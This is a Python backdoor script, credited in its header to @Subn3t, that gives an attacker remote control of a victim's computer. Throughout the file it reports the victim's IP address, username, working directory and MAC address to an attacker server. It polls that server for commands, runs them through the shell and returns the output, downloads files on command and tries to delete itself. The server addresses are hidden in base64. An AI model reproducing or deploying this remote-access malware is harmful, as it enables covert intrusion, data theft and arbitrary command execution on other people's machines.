'''

- Backdoor coded by @Subn3t
- Version: 1.0.4
- GitHub: https://github.com/gdsubn3t/Backdoor/
- You can use this code, but please give credits.
- Have fun and stay legal!

'''


import requests, sys, subprocess, urllib.request, platform, os, time, uuid, base64

def get_mac(server, xserver):
    # function to get the mac address	
    mac =  str(':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0,8*6,8)][::-1])).upper()
    requests.post(server, data={'key':'','text':'Victim\'s mac address: \033[94m' + mac + '\n'})

	
def download(server, url, filename):
    try:
	# this functin allow attacker to download a file from a url
        urllib.request.urlretrieve(url, filename) # download the file
        data = 'Succefully downloaded %s' %(filename)
	# if the file has been downloaded succeffuly send the message to the attacker
        requests.post(server, data={'key':'','text':data})
    except:
	# else it send an error message to the attacker
        requests.post(server, data={'key':'','text':'Download failed'})

def welcome(server, xserver): 
	# welcome function to get the basics informations about the victim
	ip = requests.get('http://dxxpnxt.altervista.org/bxckdxxr/address.php').text
	name = subprocess.run('whoami', shell=True, stdout = subprocess.PIPE, stderr = subprocess.PIPE)
	name = name.stdout
	directory = os.getcwd()
	# now we got the ip addres, the username and the current path
	data = '|#| '+str(ip) + '|#|' + (bytes(name).decode("utf-8")).strip()  + '|#|' + str(directory)
	# send this informations to the attacker
	requests.post(server, data={'key':'', 'text':data}) # send the data 

def main(server, xserver):
	# main function
	welcome(server, xserver)

	while (requests.get(xserver, timeout=1).text)[:3] == '|#|': # this loop waits for a command from the attacker
		pass

	# declare commands variables 
	command = ''
	oldcommand = ''

	while True: # the main loop begins
		command = requests.get(xserver).text

		if command[:3] == '$%&': # if the text begins with this key the text is a command from attacker
			command = command[3:]

			if not command == oldcommand: 
				backdoorDir = os.getcwd() # get the current directory
				if command == ':exit':
					# exit if the attacker quits the connection
					sys.exit()
				elif command[:9] == ':download':
					# call the download function
					command, url, filename = command.split(' ')
					download(server, url, filename)
				elif command == ':mac':
					# get the mac address of victim
					get_mac(server, xserver)
				elif command[:2] == 'cd':
					# command to change directory
					path = command[3:]
					os.chdir(path)
					backdoorDir = os.getcwd()
					# returns the new directory
					requests.post(server, data={'key':'','text':backdoorDir})
				elif command == ':delete':
					# auto delete function
					# THIS IS NOT FINISHED YET
					if platform.system == 'Linux':
						delete = 'rm \nrm '
						os.system('echo "'+delete+'" >> deleter.sh')
						os.system('bash deleter.sh')
					elif platform.system == 'Windows':
						delete = 'del \ndel'
						os.system('echo '+delete+' >> deleter.bat')
						os.system('start deleter.bat')
				else:
					# exec the command 
					command = subprocess.run(command, shell=True, stdout = subprocess.PIPE, stderr  = subprocess.PIPE)
					response = command.stdout + command.stderr
					requests.post(server, data={'key':'','text':response})
					oldcommand = command

if __name__ == '__main__':
	xserver = base64.b64decode('').decode('utf-8') # enter here your file text encoded in base64
	server = base64.b64decode('').decode('utf-8') # enter here your php file encoded in base64
	main(server, xserver)
